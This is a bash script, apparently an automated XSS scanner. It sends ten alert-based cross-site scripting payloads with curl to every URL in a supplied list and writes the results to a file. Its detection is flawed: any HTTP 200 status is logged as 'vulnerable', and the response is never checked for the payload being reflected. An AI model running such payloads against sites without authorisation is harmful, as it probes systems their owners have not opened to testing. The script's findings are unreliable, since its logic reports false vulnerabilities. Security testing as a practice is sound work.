#!/bin/bash

# Automated XSS Testing Script
# Usage: ./xss_test_auto.sh <url_list_file>
# Example: ./xss_test_auto.sh urls.txt

# Check for arguments
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <url_list_file>"
    exit 1
fi

# File containing URLs
URL_LIST=$1

# Output file for results
OUTPUT_FILE="results.txt"
echo "XSS Testing Results" > "$OUTPUT_FILE"

# XSS Payloads
PAYLOADS=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "<svg/onload=alert('XSS')>"
    "<iframe src=javascript:alert('XSS')></iframe>"
    "';alert('XSS');//"
    "\";alert('XSS');//"
    "<body onload=alert('XSS')>"
    "<marquee onstart=alert('XSS')>"
    "<input autofocus onfocus=alert('XSS')>"
    "<details open ontoggle=alert('XSS')>"
)

# Function to test a URL
test_xss() {
    local URL=$1

    echo "Testing URL: $URL" >> "$OUTPUT_FILE"
    echo "--------------------------------" >> "$OUTPUT_FILE"
    
    for PAYLOAD in "${PAYLOADS[@]}"; do
        # URL Encode the payload
        ENCODED_PAYLOAD=$(echo "$PAYLOAD" | jq -sRr @uri)

        # Test with the encoded payload
        RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$URL$ENCODED_PAYLOAD")

        # Check the response
        if [[ $RESPONSE -eq 200 ]]; then
            echo "[+] Vulnerable to XSS with payload: $PAYLOAD" >> "$OUTPUT_FILE"
        else
            echo "[-] Not vulnerable with payload: $PAYLOAD" >> "$OUTPUT_FILE"
        fi
    done

    echo "" >> "$OUTPUT_FILE"
}

# Read URLs from the file
while IFS= read -r URL; do
    test_xss "$URL"
done < "$URL_LIST"

echo "XSS testing completed. Results saved in $OUTPUT_FILE."
